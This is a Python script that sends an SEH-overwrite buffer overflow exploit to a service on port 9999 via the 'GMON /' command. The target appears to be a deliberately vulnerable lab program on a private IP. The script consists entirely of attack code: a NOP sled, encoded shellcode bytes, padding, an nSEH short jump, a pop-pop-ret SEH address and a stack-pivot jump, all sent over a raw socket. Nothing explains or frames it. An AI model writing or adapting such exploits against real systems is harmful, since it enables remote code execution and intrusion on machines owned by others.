import socket, sys
from struct import pack

ip = "192.168.56.135"
port = 9999
size = 0x1000

prefix = b'GMON /'
nops = b'\x90' * 40
shellcode =  b""
shellcode += b"\xb8\x24\xa2\x34\xec\xda\xc3\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x31\x31\x43\x13\x03\x43\x13"
shellcode += b"\x83\xeb\xd8\x40\xc1\x10\xc8\x07\x2a\xe9\x08"
shellcode += b"\x68\xa2\x0c\x39\xa8\xd0\x45\x69\x18\x92\x08"
shellcode += b"\x85\xd3\xf6\xb8\x1e\x91\xde\xcf\x97\x1c\x39"
shellcode += b"\xe1\x28\x0c\x79\x60\xaa\x4f\xae\x42\x93\x9f"
shellcode += b"\xa3\x83\xd4\xc2\x4e\xd1\x8d\x89\xfd\xc6\xba"
shellcode += b"\xc4\x3d\x6c\xf0\xc9\x45\x91\x40\xeb\x64\x04"
shellcode += b"\xdb\xb2\xa6\xa6\x08\xcf\xee\xb0\x4d\xea\xb9"
shellcode += b"\x4b\xa5\x80\x3b\x9a\xf4\x69\x97\xe3\x39\x98"
shellcode += b"\xe9\x24\xfd\x43\x9c\x5c\xfe\xfe\xa7\x9a\x7d"
shellcode += b"\x25\x2d\x39\x25\xae\x95\xe5\xd4\x63\x43\x6d"
shellcode += b"\xda\xc8\x07\x29\xfe\xcf\xc4\x41\xfa\x44\xeb"
shellcode += b"\x85\x8b\x1f\xc8\x01\xd0\xc4\x71\x13\xbc\xab"
shellcode += b"\x8e\x43\x1f\x13\x2b\x0f\x8d\x40\x46\x52\xdb"
shellcode += b"\x97\xd4\xe8\xa9\x98\xe6\xf2\x9d\xf0\xd7\x79"
shellcode += b"\x72\x86\xe7\xab\x37\x68\x0a\x7e\x4d\x01\x93"
shellcode += b"\xeb\xec\x4c\x24\xc6\x32\x69\xa7\xe3\xca\x8e"
shellcode += b"\xb7\x81\xcf\xcb\x7f\x79\xbd\x44\xea\x7d\x12"
shellcode += b"\x64\x3f\x1e\xf5\xf6\xa3\xcf\x90\x7e\x41\x10"
buffer = b'A' * (3534 - len(nops) - len(shellcode))
nseh = b'\xeb\x06\x90\x90'# pack('<L', 0x42424242)
seh = pack('<L', 0x625011ef) # pop ecx ; pop eax ; ret ;  # pack('<L', 0x43434343)
jump = b'\x66\x81\xC4\x83\x05\xFF\xE4'
buffer2 = b'D' * (size - len(buffer))

payload = prefix + nops + shellcode + buffer+ nseh + seh + jump + buffer2

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.settimeout(5)
		s.connect((ip, port))
		print('[*] Sending payload')
		s.send(payload)
		s.recv(1024)
except Exception as e:
	print(e)
	sys.exit(0)